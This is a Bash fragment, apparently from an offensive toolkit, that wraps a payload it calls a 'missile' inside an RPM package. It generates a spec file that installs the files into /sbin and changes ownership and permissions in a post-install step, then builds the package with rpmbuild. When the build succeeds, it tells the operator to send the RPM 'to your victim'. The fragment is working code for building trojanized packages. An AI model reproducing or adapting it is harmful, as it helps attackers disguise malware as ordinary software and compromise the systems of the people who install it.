
# rpm packagerx


_spec(){
    while read line
    do
	$line
    done << EOF > ${HOME}/rpmbuild/SPECS/${CUT_IT}.spec
set -f
echo Name:                                      ${CUT_IT}
echo Version:                                   ${vnumber}
echo Release:                                   1%{?dist}
echo Summary:                                   ${description}
echo BuildArch:                                 noarch

echo License:                                   GPL-2
echo Source0:                                   %{name}-%{version}.tar.gz


echo %description
echo ${description}


echo %prep
echo %setup -q


echo %install
echo mkdir -p \$RPM_BUILD_ROOT/sbin
echo cp -R * \$RPM_BUILD_ROOT/sbin


echo %files
echo /sbin
echo %clean
echo rm -rf \$RPM_BUILD_ROOT


echo %post
echo chown -R root:root /sbin/${CUT_IT}
echo chmod 775 /sbin/${CUT_IT}

EOF
}
createMalRpm() {
    
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y)
		echo ""
		which rpm >/dev/null 
		if [[ $? == 1 ]];then
		    
		    printf "\n${open}${bold}${red}[!]rpm package manager is not installed on your box${close}\n"
		    exit 2;
		else
		    [[ ! -d "$HOME/rpmbuild" ]] && mkdir -p "$HOME/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}"
		fi
		
		dirfile="${0##*/}${SPID}"
		mainlocation=$(pwd)
		cd "$HOME/rpmbuild/SOURCES"
		chk_file
		packagedetails
		cd "$HOME/rpmbuild/SPECS"
		_spec
		cd "$HOME/rpmbuild/SOURCES"
		mkdir "${CUT_IT}-${vnumber}"
		mv "${CUT_IT}" "${CUT_IT}-${vnumber}"
		tar -cvzf "${CUT_IT}-${vnumber}.tar.gz" "${CUT_IT}-${vnumber}"
		rm -rf "${CUT_IT}" "${CUT_IT}-${vnumber}"
		cd "$mainlocation"
		rpmbuild -v -bb "$HOME/rpmbuild/SPECS/${CUT_IT}.spec"
		mv "$HOME/rpmbuild/RPMS/noarch/${CUT_IT}-${vnumber}-1.noarch.rpm" .
		if [ $? = 0 ];then
		    printf "${open}${light}${green}Ok we are done here..${close}\n"
		    printf "${open}${light}${green}You can now send the rpm file to your victim${close}\n"
		    sleep 3
		    echo ""
		    box3d
		    break
		    exit
		    
		else
		    
		    printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
		    exit $RANDOM
		    
		fi
		
		;;
	    n|N)
		shit_func ;;
	    *)
		echo "${open}${light}${red}Invalid Response${close}" && continue ;;
	esac
    done
}
